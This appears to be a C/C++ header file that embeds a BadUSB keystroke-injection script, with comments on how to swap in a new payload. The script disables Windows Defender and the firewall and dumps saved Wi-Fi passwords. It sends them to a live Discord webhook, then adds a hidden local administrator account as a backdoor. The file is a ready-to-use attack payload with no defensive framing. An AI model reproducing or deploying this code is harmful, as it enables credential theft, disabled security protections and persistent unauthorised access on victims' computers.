#pragma once

// Built-in payload file.
// Replace only the text inside R"PAYLOAD(... )PAYLOAD" when you want a new script.
// Supported commands: DELAY <ms>, STRING <text>, ENTER, TAB, SPACE, ESC.
static const char kBuiltInPayload[] = R"PAYLOAD(
GUI r
DELAY 500
STRING powershell
CTRL-SHIFT ENTER
DELAY 1000
LEFT
ENTER
DELAY 500
STRING Set-MpPreference -DisableRealtimeMonitoring $true
ENTER
GUI r
DELAY 500
STRING powershell
CTRL-SHIFT ENTER
DELAY 1000
LEFT
ENTER
DELAY 500
STRING netsh advfirewall set allprofiles state off
ENTER
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 1000
STRING (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); "$name: $pass"}
ENTER
GUI r
DELAY 500
STRING powershell -Command "$wifi = netsh wlan show profiles; $wifi | ForEach-Object { if ($_ -match ':\s+(.+)$') { $name = $matches[1]; $pass = netsh wlan show profile name='$name' key=clear; $pass | ForEach-Object { if ($_ -match 'Key Content\s+:\s+(.+)$') { $pwd = $matches[1]; "$name:$pwd" } } } } | Out-File -FilePath C:\temp\wifi.txt -Encoding UTF8; $content = Get-Content C:\temp\wifi.txt -Raw; $json = "{\"content\":\"WiFi Data Extracted:
$content\"}"; Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1487864976520646888/oj4xF-TXP4dpu-oRESfi3k_Rm-NiwZdyTN1DrM4dsWxIMG58-ozd_XBc6ROEW3EnCwps' -Method Post -Body $json -ContentType 'application/json'"
ENTER
GUI r
DELAY 500
STRING cmd
CTRL-SHIFT ENTER
DELAY 1000
LEFT
ENTER
DELAY 500
STRING net user MEMAYBEO P@ssw0rd123 /add
ENTER
DELAY 200
STRING net localgroup administrators MEMAYBEO /add
ENTER
GUI r
DELAY 500
STRING powershell
CTRL-SHIFT ENTER
DELAY 1000
LEFT
ENTER
DELAY 500
STRING net user idk idk /add; reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v idk /t REG_DWORD /d 0 /f
ENTER)PAYLOAD";
